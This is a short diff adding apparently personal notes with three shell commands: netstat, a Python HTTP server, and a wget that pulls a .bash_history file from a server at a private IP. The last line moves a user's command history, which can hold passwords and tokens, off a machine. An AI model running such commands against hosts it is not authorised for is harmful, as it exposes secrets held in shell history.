@@ -1,0 +1,6 @@
+netstat -an
+
+
+python3 -m http.server
+// on different terminal instance
+wget http://10.4.83.59:8000/.bash_history
